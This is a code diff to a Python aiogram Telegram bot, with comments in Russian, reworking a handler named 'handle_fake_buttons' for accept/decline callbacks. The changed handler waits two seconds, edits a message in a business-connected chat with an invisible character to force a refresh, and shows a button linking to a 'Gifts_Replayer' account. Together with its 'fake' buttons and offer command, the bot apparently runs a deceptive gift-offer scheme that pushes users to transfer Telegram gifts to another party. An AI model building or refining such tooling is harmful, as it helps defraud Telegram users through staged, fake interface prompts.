@@ -143,7 +143,7 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- ИЗМЕНЕНИЕ БЕЗ БАГОВ ТЕЛЕФОНА ---
+# --- ФИНАЛЬНЫЙ ХАК ДЛЯ ТЕЛЕФОНА ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -157,14 +157,11 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
-    # 1. Мгновенно убираем "часики" с кнопки (без показа окна)
-    await callback.answer("Обработка...")
-
-    # 2. Пауза (КД) 1.5 секунды, чтобы телефон переварил нажатие
-    await asyncio.sleep(1.5)
+    # 1. ЗАДЕРЖКА 2 СЕКУНДЫ (НЕ отвечаем на колбэк, пусть крутятся часики)
+    await asyncio.sleep(2.0)
 
     if action == "accept":
-        # Добавляем невидимый символ \u200b, чтобы заставить телефон обновить текст
+        # 2. ДОБАВЛЯЕМ НЕВИДИМЫЙ СИМВОЛ (\u200b), ЧТОБЫ ТЕЛЕФОН ОБНОВИЛ КНОПКИ
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name) + "\u200b"
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
@@ -180,43 +177,25 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         new_keyboard = None
         alert_text = None
 
-    # 3. РЕДАКТИРУЕМ СООБЩЕНИЕ (БЕЗ link_preview_options!)
-    kwargs = {
-        "chat_id": callback.message.chat.id,
-        "message_id": callback.message.message_id,
-        "text": new_text,
-        "reply_markup": new_keyboard,
-        "parse_mode": "HTML"
-        # Убрали link_preview_options, чтобы мобильный клиент не тупил!
-    }
-    
-    if business_connection_id: 
-        kwargs["business_connection_id"] = business_connection_id
-
+    # 3. ИЗМЕНЯЕМ СООБЩЕНИЕ (БЕЗ LinkPreviewOptions, чтобы телефон не тупил)
     try:
-        await bot.edit_message_text(**kwargs)
-        
-        # 4. СРАЗУ ПОСЛЕ ИЗМЕНЕНИЯ ПОКАЗЫВАЕМ ОКНО
-        if alert_text:
-            await callback.answer(alert_text, show_alert=True)
-
+        await bot.edit_message_text(
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id,
+            text=new_text,
+            reply_markup=new_keyboard,
+            business_connection_id=business_connection_id,
+            parse_mode="HTML"
+        )
     except TelegramBadRequest as e:
-        if "message is not modified" in str(e).lower():
-            # Если текст не изменился (нажали дважды) - все равно показываем окно
-            if alert_text:
-                await callback.answer(alert_text, show_alert=True)
-            else:
-                await callback.answer()
-        else:
-            print(f"Ошибка редактирования: {e}")
-            # Если ошибка, принудительно показываем окно, чтобы юзер не думал, что бот умер
-            if alert_text:
-                await callback.answer(alert_text, show_alert=True)
-            if ADMIN_ID:
-                try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
-                except: pass
-    except Exception as e:
-        print(f"Неизвестная ошибка: {e}")
+        if "message is not modified" not in str(e).lower():
+            print(f"Ошибка изменения: {e}")
+
+    # 4. ПОКАЗЫВАЕМ ВСПЛЫВАЮЩЕЕ ОКНО (ТОЛЬКО ОДИН РАЗ В КОНЦЕ)
+    if alert_text:
+        await callback.answer(alert_text, show_alert=True)
+    else:
+        await callback.answer()
 
 async def main():
     print("Бот запущен...")
